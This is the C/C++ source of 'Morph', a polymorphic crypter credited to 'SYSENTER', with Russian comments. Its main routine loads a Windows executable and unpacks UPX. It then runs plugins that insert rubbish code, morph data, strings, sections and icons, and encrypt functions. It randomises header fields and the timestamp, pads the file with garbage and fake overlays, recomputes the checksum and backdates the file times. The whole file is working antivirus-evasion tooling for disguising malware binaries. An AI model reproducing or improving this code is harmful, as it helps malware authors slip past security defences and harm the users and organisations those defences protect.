#include "GeneRator.h"
#include <Mmsystem.h>
char szTempDir[MAX_PATH]={0};
BOOL F_UPX = FALSE;
BOOL F_TLS = FALSE;
//******************************

//----------------------------------------------------------------
//The _ImageRvaToSection function locates a relative virtual 
//address (RVA) within the image header of a file that is 
//mapped as a file and returns a pointer to the section table 
//entry for that virtual address.
PIMAGE_SECTION_HEADER _ImageRvaToSection(char* Base,DWORD dwRVA)
{
	IMAGE_SECTION_HEADER section;
	IMAGE_NT_HEADERS nt_headers;
	DWORD dwPE_Offset,SectionOffset;
	CopyMemory(&dwPE_Offset,Base+0x3c,4);
	CopyMemory(&nt_headers,Base+dwPE_Offset,sizeof(IMAGE_NT_HEADERS));
	SectionOffset=dwPE_Offset+sizeof(IMAGE_NT_HEADERS);
	for(int i=0;i<nt_headers.FileHeader.NumberOfSections;i++)
	{
		CopyMemory(&section,Base+SectionOffset+i*0x28,sizeof(IMAGE_SECTION_HEADER));
		if((dwRVA>=section.VirtualAddress) && (dwRVA<=(section.VirtualAddress+section.SizeOfRawData)))
		{
			return ((PIMAGE_SECTION_HEADER)&section);
		}
	}
	return(NULL);
}
//----------------------------------------------------------------
// calulates the Offset from a RVA
// Base    - base of the MMF
// dwRVA - the RVA to calculate
// returns 0 if an error occurred else the calculated Offset will be returned
DWORD RVA2Offset(char* Base,DWORD dwRVA)
{
	DWORD _offset;
	PIMAGE_SECTION_HEADER section;
	section=_ImageRvaToSection(Base,dwRVA);
	if(section==NULL)
	{
		return(0);
	}
	_offset=dwRVA+section->PointerToRawData-section->VirtualAddress;
	return(_offset);
}
//******************************
BYTE bEx =0;
//--------------------------
LONG DebugInformator(PEXCEPTION_POINTERS p_excep)
{ 
	PEXCEPTION_RECORD p_excep_record = p_excep->ExceptionRecord;
	//printf("ExceptionCode:0x%X\n",LOBYTE(p_excep_record->ExceptionCode));
	bEx = LOBYTE(p_excep_record->ExceptionCode);
	return EXCEPTION_EXECUTE_HANDLER;
}
//---------------------------------------------------------------------------------------------------------------------
int main(int argc, char* argv[])
{
	PIMAGE_TLS_DIRECTORY32 pimage_tls_directory;
	char* szSamplePathName = argv[1];
	char* szToMorphPathName = argv[2];
	char szCommandLine[MAX_PATH*2]={0};
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	PIMAGE_DOS_HEADER pidh;
	PIMAGE_NT_HEADERS pinh;
	PIMAGE_OPTIONAL_HEADER pioh;
	PIMAGE_SECTION_HEADER pish;
	char szTempPathFile[MAX_PATH]={0};
	char szCurDir[MAX_PATH+1]={0};
__try
{
	GetModuleFileName(NULL, szCurDir, MAX_PATH);
	*(strrchr(szCurDir,'\\')) =0;
	SetCurrentDirectory(szCurDir);
	printf(" -----------------------------------------------------------------------\n|  Morph v7.3.0(c)2010 - 2012 SYSENTER Jabber:sysenter@jabber.no\t\t|\n|\t\t\t\t\t\t\t PolyMorph x86 version\t\t\t\t        |\n|\t\t\t\t\t\t\t    New Generation   \t\t\t\t        |\n -----------------------------------------------------------------------\n\n");
	if(argc<=1)
	{
		printf("Usage: Morph.exe <PathSample> <PathSourceToMorph>\n\n");
		__ERR("Number of arguments is invalid!");
	}
	GetTempPath(MAX_PATH-1,szTempDir);
	strcpy(szTempPathFile,szTempDir); strcat(szTempPathFile,rnddstr(4,9,NULL)); strcat(szTempPathFile,".exe");
	DeleteFile(szTempPathFile);
	//Загружаем образец для проверки хидера
	hHeap = HeapCreate(0,0xFFFF,0); if(!hHeap) __ERR("Create Work Heap!");
	PBYTE lpShellBuff=NULL;
	DWORD dwShellSize = LoadPE(argv[1],&lpShellBuff);
	OutputDebugStringA(argv[1]);
	if(!dwShellSize || lpShellBuff == NULL) __ERR("Open Target!");

	strcpy(szSecName,rnddstr(3,7,NULL));
	sprintf(szSEC,".%s",szSecName);

	pidh= (PIMAGE_DOS_HEADER)lpShellBuff;
	pinh= PIMAGE_NT_HEADERS(DWORD(lpShellBuff) + DWORD(pidh->e_lfanew));
	if(pinh->Signature!=0x4550) __ERR("Is not PE - File!");
	pioh =&(pinh->OptionalHeader);
	if(pioh->Subsystem !=2 && pioh->Subsystem != 3)
	{
		__ERR("Is not Windows File!");
	}

	//Проверяем есть ли TLS директория
	DWORD dwTlsDirAddr = pioh->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
	if(dwTlsDirAddr)
	{
		//TLS есть
		F_TLS = TRUE;
		pimage_tls_directory = (PIMAGE_TLS_DIRECTORY32) RVA2Offset((char*)lpShellBuff,dwTlsDirAddr);
		//MessageBoxA(GetActiveWindow(),"FATAL ERROR:\nSorry TLS directory section is not supported.\nGet rid of the TLS section will continue.\nExit.","Krypton by Sysenter",MB_ICONEXCLAMATION);
		char szTLS[MAX_PATH];
		pimage_tls_directory = (PIMAGE_TLS_DIRECTORY32)((DWORD)lpShellBuff + (DWORD)pimage_tls_directory);
		sprintf(szTLS,"0x%X",pimage_tls_directory->StartAddressOfRawData);
		//MessageBoxA(GetActiveWindow(),szTLS,"Krypton by Sysenter",MB_ICONEXCLAMATION);
		//ExitProcess(0xFFFFFFFF);
	}

	

	HeapFree(hHeap,0,lpShellBuff);
	GetCurrentDirectoryA(MAX_PATH,szCurDir);
	strcat(szCurDir,"\\"); strcpy(szPluginDir,szCurDir); strcat(szPluginDir,"PlugIn\\");
	strcpy(szPESniffer,szPluginDir); strcat(szPESniffer,"PESniffer.dll");
	strcpy(szSelfScan,szPluginDir); strcat(szSelfScan,"selfscan.dll");
	strcpy(szGenOep,szPluginDir); strcat(szGenOep,"genoep.dll");
	strcpy(szUPX,szPluginDir); strcat(szUPX,"upx.exe");
	strcpy(szPmorph,szPluginDir); strcat(szPmorph,"pmorph.dll");
	strcpy(szMophIco,szPluginDir); strcat(szMophIco,"morphico.exe");
	strcpy(szIcoExtract,szPluginDir); strcat(szIcoExtract,"iconextr.exe");
	
	GetPack=(_GetPack)GetProcAddress(LoadLibrary(szSelfScan),"DetectPacker");
	AnalyzeFile=(_AnalyzeFile)GetProcAddress(LoadLibrary(szPESniffer),"AnalyzeFile");
	FindOEP=(_FindOEP)GetProcAddress(LoadLibrary(szGenOep),"FindOEP");
	if(GetPack)
	{
		char* szReDetect = GetPack(argv[1]);
		if(strcmp(szReDetect,"unknown"))
		{
			printf("File Probably Packed/Linked: %s\n",szReDetect);
			if(!_strnicmp(szReDetect,"upx",3))
			{
				F_UPX = TRUE;
				printf("WARNING UPX!!!!\n");
				RtlZeroMemory(&si,sizeof(si));
				si.cb = sizeof(STARTUPINFOA);
				sprintf(szCommandLine,"%s -d %s",szUPX, argv[1]);
				if(CreateProcessA(NULL,szCommandLine,NULL,NULL, FALSE,CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
				{
					WaitForSingleObject(pi.hProcess,INFINITE);
					DWORD dwExitCode = 0;
					if(GetExitCodeProcess(pi.hProcess,&dwExitCode))
					{
						if(dwExitCode==0)
						{
							printf("UPX Decompressed sucessfully!\n");
						} else __ERR("UPX Decompress Filed!!!\n");
					}
					CloseHandle(pi.hProcess);
				}
			}
			else
			{

			}
		}
	}
	if(AnalyzeFile)
	{
		char szDetectBuf[MAX_PATH]={0};
		if(!AnalyzeFile(argv[1],0,0,szDetectBuf))
		{
			if(_stricmp(szDetectBuf,"unk"))
			{
				printf("File Probably Packed/Linked: %s\n",szDetectBuf);
			}
		}
	}

	//Загружаем образец для проверок
	lpShellBuff=NULL;
	dwShellSize = LoadPE(szSamplePathName,&lpShellBuff);
	if(!dwShellSize || lpShellBuff == NULL) 
	{
		printf("ERROR Open Target: %s\n",szSamplePathName);
		ExitProcess(0);
	}
	//Если вдруг файл был распакован нами, то проверяем PE - хидер
	pidh= (PIMAGE_DOS_HEADER)lpShellBuff;
	pinh= PIMAGE_NT_HEADERS(DWORD(lpShellBuff) + DWORD(pidh->e_lfanew));
	if(pinh->Signature!=0x4550) __ERR("Is not PE - File!");
	pioh =&(pinh->OptionalHeader);
	if(pioh->Subsystem !=2 && pioh->Subsystem != 3)
	{
		__ERR("Is not Windows File!");
	}
	else
	{

	}
	//Последняя секция
	pish = (PIMAGE_SECTION_HEADER)&lpShellBuff[pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * (pinh->FileHeader.NumberOfSections-1)];
	DWORD dwOvrStartNoAlign = pish->PointerToRawData + pish->SizeOfRawData;
	DWORD dwOvrStart = ALIGN_UP(dwOvrStartNoAlign,pioh->SectionAlignment);
	DWORD dwOvrLen =0;
	BOOL bOvr = FALSE;
	LPBYTE lpbOvr = NULL;

	//Ищем начало секции .data и её Длину
	PBYTE pbStartData = NULL;
	DWORD dwLenghtData = 0;
	//for(int i = 0; i < pinh->FileHeader.NumberOfSections; i++)
	{	
		pish = (PIMAGE_SECTION_HEADER)&lpShellBuff[pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER)];
		//if((pish->Name[0]=='.' && pish->Name[1]=='d' && pish->Name[2]=='a' && pish->Name[3]=='t' && pish->Name[4]=='a') || (pish->Name[0]=='D' && pish->Name[1]=='A' && pish->Name[2]=='T' && pish->Name[3]=='A'))
		{
			//Beep(4000,10);
			dwLenghtData = pish->	SizeOfRawData;
			pbStartData = &lpShellBuff[pish->PointerToRawData];printf("dwLenghtData:0x%X, offsetData:0x%X\n",dwLenghtData,pish->PointerToRawData);
			//break;
		}
	}

	//dwOvrStart=0x34E00; //У кого-то оверлей не определялся сам
	//dwOvrStart = 0x20A00;

	printf("dwOvrStart=0x%X : 0x%X, dwShellSize=0x%X\n",dwOvrStart,dwOvrStartNoAlign,dwShellSize);
	
	if(dwOvrStart < dwShellSize)
	{
		bOvr = TRUE;
		goto _ovr;
	}
	if(dwOvrStartNoAlign < dwShellSize)
	{
		bOvr = TRUE;
		dwOvrStart = dwOvrStartNoAlign;
	}
_ovr:
	if(bOvr)
	{
		dwOvrLen = dwShellSize - dwOvrStart;
		//Найден оверлей
		printf("OVERLAY FOUND IN OFFSET:0x%X\nOVERLAY LENGHT:0x%X\n",dwOvrStart,dwOvrLen);
		//Копируем оверлей в буфер 
		lpbOvr = (LPBYTE)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwOvrLen);
		RtlCopyMemory(lpbOvr,lpShellBuff+dwOvrStart,dwOvrLen);
		printf("OVR[0]=0x%X\n",lpbOvr[0]);
	} 
	else
	{
		printf("OVERLAY NOT PRESENT\n");
		dwOvrStart = 0;
	}
	
	long double Entropy0 = (entropy(lpShellBuff,dwShellSize) + EntropyB(lpShellBuff,dwShellSize))/2;
	printf("Target code size: %d\nAveraged Input Entropy: %.1f\n",dwShellSize,Entropy0);
	LPBYTE szGLOBAL;
	//Открываем то что будем морфить
	DWORD dwSize=LoadPE(szToMorphPathName,&szGLOBAL);
	char szPlugin[MAX_PATH]={0};
	strcpy(szPlugin,szPluginDir); strcat(szPlugin,"pmorph.dll");
	HMODULE hMorph = LoadLibrary(szPlugin);
	struct tm *xtm;
	if(hMorph)
	{				
		__GenerateRubbishCode=(_GenerateRubbishCode)GetProcAddress(hMorph,"GenerateRubbishCode");
		if(__GenerateRubbishCode) printf("Polymorh Engine Loaded\n");
		gByteMorph = xDataMorph((PBYTE)szGLOBAL,dwSize);//xDataMorph((PBYTE)pbStartData,dwLenghtData); //
		DataMorph(TRUE, (PBYTE)szGLOBAL,dwSize);
		DataMorph(TRUE, (PBYTE)szGLOBAL,dwSize);
		DataMorph(TRUE, (PBYTE)szGLOBAL,dwSize);
		StringMorph((PBYTE)szGLOBAL,dwSize);
		StringMorph((PBYTE)szGLOBAL,dwSize);
		StringMorph((PBYTE)szGLOBAL,dwSize);
		StringMorph((PBYTE)szGLOBAL,dwSize);
		StringMorph((PBYTE)szGLOBAL,dwSize);
		Morpher(TRUE,(PBYTE)szGLOBAL,dwSize);
		IcoMorph((PBYTE)szGLOBAL,dwSize);
		SectionMorph((PBYTE)szGLOBAL,dwSize);
		printf("FUNCTION CRYPTED: %d\n",FunCript((PBYTE)szGLOBAL,dwSize));
		pidh= (PIMAGE_DOS_HEADER)szGLOBAL;
		pinh= PIMAGE_NT_HEADERS(DWORD(szGLOBAL) + DWORD(pidh->e_lfanew));

		pioh =&(pinh->OptionalHeader);
		pinh->FileHeader.TimeDateStamp = xor128X(0x3C000000,0x4C000000);
		pish = (PIMAGE_SECTION_HEADER)((PCHAR)(pinh) + sizeof(IMAGE_FILE_HEADER) + pinh->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_NT_SIGNATURE));

		pioh->MajorLinkerVersion = xor128(1,12);
		pioh->MinorLinkerVersion = xor128(0,3);
		pioh->MajorImageVersion = xor128(0,255);
		pioh->MinorImageVersion = xor128(0,255);
		pioh->MajorSubsystemVersion = 4;
		pioh->MajorOperatingSystemVersion = 4;
		pioh->MinorOperatingSystemVersion = 0;
		pioh->MinorSubsystemVersion = 0;
		//PeHeader.FileHeader.Characteristics
		//Секцию кода на запись
		//if(!(pish->Characteristics & IMAGE_SCN_MEM_WRITE)) pish->Characteristics = pish->Characteristics | IMAGE_SCN_MEM_WRITE;
		if(!(pish->Characteristics & IMAGE_SCN_MEM_WRITE)) pish->Characteristics = 0x60000020 | IMAGE_SCN_MEM_WRITE;
		//Добавляем флаг IMAGE_FILE_DEBUG_STRIPPED
		/*IMAGE_FILE_HEADER *pFileHeader = (IMAGE_FILE_HEADER*)(szGLOBAL + pidh->e_lfanew + sizeof(DWORD));
		pFileHeader->Characteristics = pFileHeader->Characteristics | IMAGE_FILE_DEBUG_STRIPPED;*/

		xtm = gmtime((const time_t *)&pinh->FileHeader.TimeDateStamp);
		printf("Set TimeDateStamp: %d.%d.%d | 0x%X\n", xtm->tm_mday, xtm->tm_mon, (xtm->tm_year + 1900),pinh->FileHeader.TimeDateStamp);
	}

	CreatePE(TRUE,szToMorphPathName,(LPBYTE)szGLOBAL,dwSize);
	printf("File: %s created\n",szToMorphPathName);
	dwShellSize = dwShellSize - dwOvrLen;
	DWORD dwBSZ = sizeof(SCOMP) + dwShellSize*8; //Размер выделенного буфера
	LPBYTE lpCompressed = (LPBYTE)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwBSZ*10);
	if(lpCompressed==NULL) {DPRINT("ERROR HeapAlloc"); ExitProcess(-1);}
	SCOMP scomp;
	LPBYTE lpData = lpCompressed+sizeof(SCOMP);

	scomp.dwSzCompBlock = dwShellSize;
	memcpy(lpData,lpShellBuff,dwShellSize);

	//Добавляем к нужному файлу хвост-оверлей №1
	DWORD dwAddedSize = xor128X(0,0.01*dwShellSize);//*********************************************
	printf("Add garbage: %d byte\n",dwAddedSize);
	dwShellSize = dwShellSize + dwAddedSize;
	LPBYTE lpGarbage = (LPBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwAddedSize+1);
	
	//Создаем мусорный буфер
	//Вариант №1 - нули
	//Вариант №2 - мусор
	//Вариант №3 - мусорный код (не сделано)
	//Вариант №4 - мусорный текст из словаря (не сделано)
	BYTE bRandGarb = xor128(0,255);
	for(int cr=0;cr<dwAddedSize;cr++)
	{
		lpGarbage[cr] =  bRandGarb;
	}

	scomp.dwSzUncompBlock = dwShellSize;
	memcpy(lpCompressed,&scomp,sizeof(SCOMP));
	DWORD dwFullSize = scomp.dwSzCompBlock + sizeof(SCOMP)+dwAddedSize;
	DWORD dwTT=0;
		
	//Добавление иконки
	BOOL F_ICO_ENABLE = FALSE;
	char szIco0[MAX_PATH]={0};
	char szIco[MAX_PATH]={0};
	strcpy(szIco0,szPluginDir); strcat(szIco0,"ico0.ico");
	strcpy(szIco,szPluginDir); strcat(szIco,"ico.ico");
	BYTE b = 0;
	lpShellBuff = NULL;
	dwShellSize = LoadPE(szToMorphPathName,&lpShellBuff);
	if(!dwShellSize || lpShellBuff == NULL) __ERR("Open Result!");
	if(!DeleteFile(szToMorphPathName))  __ERR("Delete Result!");
	
	//dwAddedSize = 0;

	//Это и есть 1-я часть оверлея
	if(dwAddedSize)	RtlCopyMemory(lpShellBuff+dwShellSize,lpGarbage,dwAddedSize);
	printf("AddedSize Garbage  = %d\n",dwAddedSize);
	printf("Overlay = %d\n",dwOvrLen);

	//dwOvrLen =0;

	DWORD dwFOvrLen = 0;
	//Добавляем оверлей, если нужно
	if(dwOvrLen)
	{
		dwFOvrLen =  ALIGN_UP(xor128X(dwOvrLen,2*dwOvrLen),64);
		printf("TRY ADDING OVERLAY\n");
		printf("OvrStart=0x%X\nFullSizeOverlay=0x%X\nTrueOvrLen=0x%X\n",dwOvrStart,dwFOvrLen+dwOvrLen,dwOvrLen);
		BYTE bb = xor128(0,255);
		LPBYTE lpbFOvr = (LPBYTE)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwFOvrLen);
		for(DWORD c=0;c<dwFOvrLen;c++)
		{
			lpbFOvr[c] = xor128(0,255);
		}
		RtlCopyMemory(lpShellBuff+dwShellSize+dwAddedSize,lpbFOvr,dwFOvrLen);
		RtlCopyMemory(lpShellBuff+dwShellSize+dwAddedSize,lpbOvr,dwOvrLen);
		printf("OVERLAY ADDED\n");
		dwOvrLen = dwOvrLen + dwFOvrLen;
	}
	else
	{
		//Фейковый оверлей
		dwOvrLen = ALIGN_UP(xor128X(0.01,0.1*dwShellSize),64);
		if(dwOvrLen)
		{
			BYTE bb = xor128(0,255);
			printf("TRY ADDING FAKE OVERLAY:%d\n",dwOvrLen);
			printf("OvrLen=0x%X\n",dwOvrLen);
			lpbOvr = (LPBYTE)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwOvrLen);
			for(DWORD c=0;c<dwOvrLen;c++)
			{
				lpbOvr[c] = 0;//xor128(0,255);//bb;//
			}
			RtlCopyMemory(lpShellBuff+dwShellSize+dwAddedSize,lpbOvr,dwOvrLen);
			printf("FAKE OVERLAY ADDED\n");
		}
	}

	//Добавляем оверлей, если нужно
	//if(dwOvrLen)
	//{
	//	printf("TRY ADDING OVERLAY\n");
	//	printf("[%X][%X][%X][%X]\ndwOvrLen=0x%X\n",lpbOvr[0],lpbOvr[1],lpbOvr[2],lpbOvr[3],dwOvrLen);
	//	RtlCopyMemory(lpShellBuff+dwShellSize+dwAddedSize,lpbOvr,dwOvrLen);
	//	printf("OVERLAY ADDED\n");
	//}
	//else
	//{
	//	//Фейковый оверлей
	//	dwOvrLen = ALIGN_UP(xor128X(0.02,0.07*dwShellSize),64);
	//	if(dwOvrLen)
	//	{
	//		BYTE bb = xor128(0,255);
	//		printf("TRY ADDING FAKE OVERLAY:%d\n",dwOvrLen);
	//		printf("OvrLen=0x%X\n",dwOvrLen);
	//		lpbOvr = (LPBYTE)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwOvrLen);
	//		for(DWORD c=0;c<dwOvrLen;c++)
	//		{
	//			lpbOvr[c] = bb;//xor128(0,255);
	//		}
	//		RtlCopyMemory(lpShellBuff+dwShellSize+dwAddedSize,lpbOvr,dwOvrLen);
	//		printf("FAKE OVERLAY ADDED\n");
	//	}
	//}

	
	pidh= (PIMAGE_DOS_HEADER)lpShellBuff;
	pinh= PIMAGE_NT_HEADERS(DWORD(lpShellBuff) + DWORD(pidh->e_lfanew));
	pioh =&(pinh->OptionalHeader);

	//Если у исходного файла есть TLS, переносим в наш все параметры
	if(F_TLS)
	{
		printf("ADD TLS\n");
		pidh= (PIMAGE_DOS_HEADER)lpShellBuff;
		pinh= PIMAGE_NT_HEADERS(DWORD(lpShellBuff) + DWORD(pidh->e_lfanew));
		if(pinh->Signature!=0x4550) __ERR("Is not PE - OutputFile!");
		pioh =&(pinh->OptionalHeader);
		if(pioh->Subsystem !=2 && pioh->Subsystem != 3)
		{
			__ERR("Is not Windows OutputFile!");
		}

		DWORD dwTlsDirAddrX = pioh->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
		if(dwTlsDirAddrX)
		{
			PIMAGE_TLS_DIRECTORY32 pimage_tls_directoryX = (PIMAGE_TLS_DIRECTORY32) ImageDirectoryOffset((char*)lpShellBuff,IMAGE_DIRECTORY_ENTRY_TLS);
			//char szTLS[MAX_PATH];
			//pimage_tls_directoryX = (PIMAGE_TLS_DIRECTORY32)((DWORD)lpShellBuff + (DWORD)pimage_tls_directoryX);
			//memcpy(&pimage_tls_directoryX->StartAddressOfRawData,&pimage_tls_directory->StartAddressOfRawData,sizeof(DWORD));
			//sprintf(szTLS,"0x%X",pimage_tls_directoryX->StartAddressOfRawData);
			//MessageBoxA(NULL,szTLS,0,0);
			//memcpy(pimage_tls_directoryX,pimage_tls_directory,sizeof(IMAGE_TLS_DIRECTORY32));
		}
	}

	//Подправляем cheksum
	/*if(pioh->CheckSum!=0)*/ pioh->CheckSum = CalcCheckSum(lpShellBuff,dwShellSize+dwOvrLen+dwAddedSize);

	//смотрим компилили с Debug директорией или нет
	PIMAGE_DEBUG_DIRECTORY pdd = (PIMAGE_DEBUG_DIRECTORY)ImageDirectoryOffset(lpShellBuff, IMAGE_DIRECTORY_ENTRY_DEBUG);
	if(pdd)
	{
		//pdd->TimeDateStamp = 0;//pinh->FileHeader.TimeDateStamp;
	}

	if(CreatePE(TRUE,szToMorphPathName,lpShellBuff,dwShellSize+dwOvrLen+dwAddedSize)!=INVALID_HANDLE_VALUE)
	{
		printf("_________________________________________\nCheckSum: 0x%X\n",pioh->CheckSum);

		//Смотрим реальные параметры получившегося файла
		HANDLE hF = CreateFileA(szToMorphPathName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hF)
		{
			DWORD dwTemp,dwFilesize = GetFileSize(hF,&dwTemp);
			DPRINT("Output FileSize: %d",dwFilesize);
			LPBYTE lpB =(LPBYTE) malloc(dwFilesize);
			if(ReadFile(hF,lpB,dwFilesize,&dwTemp,NULL))
			{
				Entropy0 = (entropy(lpB,dwFilesize) + EntropyB(lpB,dwFilesize))/2;
				printf("Averaged Output Entropy: %.1f\n",Entropy0);
				char szMD5[64]={0};
				DWORD dwHiSz;
				DWORD dwResultSize = GetFileSize(hF,&dwHiSz);
				printf("Result size: %d byte\n",dwResultSize);
				if(MD5((char*)lpB,dwFilesize,szMD5)) printf("OUT MD5: %s\n_________________________________________\n",szMD5);
			}
			FILETIME ft_sample_create, ft_sample_dostup,ft_sample_change;
			if(GetFileTime(hF,&ft_sample_create, &ft_sample_dostup, &ft_sample_change))
			{
				SYSTEMTIME ST;
				ZeroMemory(&ST,sizeof(SYSTEMTIME));
				FileTimeToSystemTime(&ft_sample_create,&ST);
				ST.wYear = xtm->tm_year + 1900;              
				ST.wDay = xtm->tm_mday;
				ST.wMonth = xtm->tm_mon + 1;
				ST.wSecond = xtm->tm_sec;
				ST.wMinute = xtm->tm_min;
				ST.wHour = xtm->tm_hour;
				ST.wDayOfWeek = xtm->tm_wday;
				ST.wDay = xtm->tm_mday;
				ST.wMonth = xtm->tm_mday;
				ST.wYear = xtm->tm_year + 1900;
				SystemTimeToFileTime(&ST,&ft_sample_create);
				SetFileTime(hF, &ft_sample_create, &ft_sample_create, &ft_sample_create);
			}
			FlushFileBuffers(hF);
			CloseHandle(hF);
		}
	}
	else
	{
		printf("\t*********\n\t* ERROR *\n\t*********\n");
	}



	DeleteFileA("E:\\Temp\\XCrypted.exe");
	CopyFileA(szToMorphPathName,"E:\\Temp\\XCrypted.exe",FALSE);
	

	{
		printf(">>End crypting.\n");
		printf("\t******\n\t* OK *\n\t******\n");
	}
	//if(!F_UPX)
	//{
	//	//Если нет UPX - то пакуем --ultra-brute 
	//	sprintf(szCommandLine,"%s -9 %s",szUPX, szToMorphPathName);
	//	printf("TRY PACK [MAX_COMPRESSION], Please wait...\n");
	//	RtlZeroMemory(&si,sizeof(si));
	//	si.cb = sizeof(STARTUPINFOA);
	//	if(CreateProcessA(NULL,szCommandLine,NULL,NULL, FALSE,CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	//	{
	//		WaitForSingleObject(pi.hProcess,INFINITE);
	//		DWORD dwExitCode = 0;
	//		if(GetExitCodeProcess(pi.hProcess,&dwExitCode))
	//		{
	//			if(dwExitCode==0)
	//			{
	//				printf("Compress sucessfully!\n");
	//			} 
	//			else
	//			{
	//				printf("Compress Filed!!!\n");
	//				__ERR("ThisFile not valid!!!\n");
	//			}
	//		}
	//	}
	//}
}
__except(EXCEPTION_EXECUTE_HANDLER)
{
	printf("Exception in Morher!!!\n");
	ExitProcess(-1);
}
	ExitProcess(0);
}
//---------------------------------------------------------------------------------------------------------------------
